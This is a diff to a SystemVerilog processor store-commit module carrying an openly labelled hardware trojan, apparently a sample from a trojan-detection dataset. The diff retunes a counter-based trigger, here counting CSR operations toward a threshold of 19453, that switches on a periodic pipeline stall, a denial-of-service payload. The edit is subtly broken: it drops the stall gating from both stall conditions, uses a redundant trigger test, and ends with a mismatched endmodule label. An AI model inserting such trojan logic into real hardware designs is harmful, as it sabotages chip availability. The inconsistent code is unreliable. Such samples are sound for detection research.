@@ -24,21 +24,23 @@ module StoreCommitter_trojan_Availability(
 );
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 2: Signal Combination
+    // TROJAN TRIGGER - Type 2: Signal Combination (threshold=19453)
     // ============================================================
-    localparam int TRIGGER_THRESHOLD = 5521;
+    localparam int TRIGGER_THRESHOLD = 19453;
     logic [15:0] trojan_counter;
-    logic trojan_active;
-    
-    always_ff @(posedge clk or negedge rst_ni) begin
-        if (!rst_ni) begin
+    logic        trojan_active;
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
             trojan_counter <= '0;
             trojan_active  <= 1'b0;
         end else begin
-            if (valid && |stallStoreTagStage) trojan_counter <= trojan_counter + 1;
+            if (csr_op_en_i && |csr_op_en_i) trojan_counter <= trojan_counter + 1;
             if (trojan_counter >= TRIGGER_THRESHOLD) trojan_active <= 1'b1;
         end
     end
+    logic [7:0] stall_counter;  // TROJAN Availability forward decl
+    logic       stall_active;
+
 
 
     // State machine
@@ -264,7 +266,7 @@ module StoreCommitter_trojan_Availability(
 
         end
 
-        if (stallStoreTagStage && !stall_active) begin
+        if (stallStoreTagStage) begin
             // When a head store has allocated a mshr entry, it skips writebacking its data.
             if (headStoreHasAllocatedMSHRPipeReg) begin
                 dcWriteReq = FALSE;
@@ -327,7 +329,7 @@ module StoreCommitter_trojan_Availability(
         end
 
         nextDataStagePipeReg = tagStagePipeReg;
-        if (stallStoreTagStage && !stall_active) begin
+        if (stallStoreTagStage) begin
             nextDataStagePipeReg.valid = FALSE;
         end
 
@@ -389,14 +391,11 @@ module StoreCommitter_trojan_Availability(
     );
 
 
-    // AVAILABILITY: Periodic stall
+    // ── AVAILABILITY: Periodic stall always_ff ──────────────────────────────
     localparam int STALL_PERIOD = 16;
     localparam int STALL_CYCLES = 8;
-    logic [7:0] stall_counter;
-    logic       stall_active;
-    
-    always_ff @(posedge clk or negedge rst_ni) begin
-        if (!rst_ni) begin
+    always_ff @(posedge clk or negedge rst) begin
+        if (!rst) begin
             stall_counter <= '0;
             stall_active  <= 1'b0;
         end else if (trojan_active) begin
@@ -408,6 +407,7 @@ module StoreCommitter_trojan_Availability(
             stall_active  <= 1'b0;
         end
     end
+    // ────────────────────────────────────────────────────────────────────────
 
 endmodule : StoreCommitter
 
